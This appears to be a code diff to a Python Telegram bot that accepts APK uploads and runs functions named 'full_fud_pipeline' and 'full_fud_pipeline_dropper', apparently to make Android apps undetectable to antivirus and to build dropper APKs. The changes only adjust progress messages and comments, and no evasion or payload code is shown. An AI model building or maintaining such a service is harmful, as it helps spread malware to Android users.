@@ -31,17 +31,29 @@ def run_flask():
     flask_app.run(host="0.0.0.0", port=port, use_reloader=False, debug=False)
 
 
-async def _heartbeat(status, stop_event, prefix):
+def _read_step(session_dir):
+    try:
+        p = os.path.join(session_dir, "step.txt")
+        if os.path.exists(p):
+            with open(p) as f:
+                return f.read().strip()
+    except Exception:
+        pass
+    return "starting"
+
+
+async def _heartbeat(status, stop_event, prefix, session_dir):
     start = time.time()
     while not stop_event.is_set():
         try:
-            await asyncio.wait_for(stop_event.wait(), timeout=25)
+            await asyncio.wait_for(stop_event.wait(), timeout=15)
             return
         except asyncio.TimeoutError:
             pass
         elapsed = int(time.time() - start)
+        step = _read_step(session_dir)
         try:
-            await status.edit_text(f"{prefix}\n⏳ {elapsed}s elapsed (live logs dekho)")
+            await status.edit_text(f"{prefix}\nstep: {step}\n⏳ {elapsed}s")
         except Exception:
             pass
 
@@ -78,7 +90,9 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         size_mb = os.path.getsize(input_path) / (1024 * 1024)
 
         await status.edit_text(f"🔧 Tools check... (APK {size_mb:.1f} MB)")
-        hb_task = asyncio.create_task(_heartbeat(status, stop_hb, "🔧 Tools check..."))
+        hb_task = asyncio.create_task(
+            _heartbeat(status, stop_hb, "🔧 Tools check...", session_dir)
+        )
 
         await asyncio.to_thread(ensure_tools)
 
@@ -87,10 +101,12 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await hb_task
         except Exception:
             pass
-        stop_hb = asyncio.Event()
-        hb_task = asyncio.create_task(_heartbeat(status, stop_hb, "🧬 Processing APK..."))
 
-        await status.edit_text("🧬 Processing APK... (logs dekho)")
+        stop_hb = asyncio.Event()
+        hb_task = asyncio.create_task(
+            _heartbeat(status, stop_hb, "🧬 Processing APK...", session_dir)
+        )
+
         await asyncio.to_thread(
             full_fud_pipeline, input_path, output_path, session_dir
         )
@@ -157,8 +173,9 @@ async def handle_dropper_apk(update: Update, context: ContextTypes.DEFAULT_TYPE)
             await asyncio.to_thread(ensure_tools)
 
             stop_hb = asyncio.Event()
-            hb_task = asyncio.create_task(_heartbeat(status, stop_hb, "🧬 Building dropper..."))
-            await status.edit_text("🧬 Building dropper...")
+            hb_task = asyncio.create_task(
+                _heartbeat(status, stop_hb, "🧬 Building dropper...", session_dir)
+            )
 
             await asyncio.to_thread(
                 full_fud_pipeline_dropper,
@@ -189,12 +206,11 @@ async def handle_dropper_apk(update: Update, context: ContextTypes.DEFAULT_TYPE)
 
 
 async def run_bot():
-    # Tools complete hone tak wait karo. Telegram messages queue me rahenge.
     print("[*] waiting for tools before polling...", flush=True)
     while not _setup_done.is_set():
         await asyncio.sleep(2)
     if _setup_error["exc"]:
-        print(f"[!] setup failed, bot still starting: {_setup_error['exc']}", flush=True)
+        print(f"[!] setup failed, bot starting anyway: {_setup_error['exc']}", flush=True)
     print("[✓] tools ready, starting polling...", flush=True)
 
     await asyncio.sleep(3)
@@ -212,7 +228,6 @@ async def run_bot():
     ))
 
     try:
-        # pending updates DROP MAT karo — user ke bheje APK queue me hai
         await app.bot.delete_webhook(drop_pending_updates=False)
     except Exception as e:
         print(f"[!] delete_webhook: {e}", flush=True)
@@ -224,7 +239,7 @@ async def run_bot():
         try:
             await app.updater.start_polling(
                 allowed_updates=Update.ALL_TYPES,
-                drop_pending_updates=False,   # <- yahi fix hai
+                drop_pending_updates=False,
             )
             print("🤖 Bot polling active.", flush=True)
             break
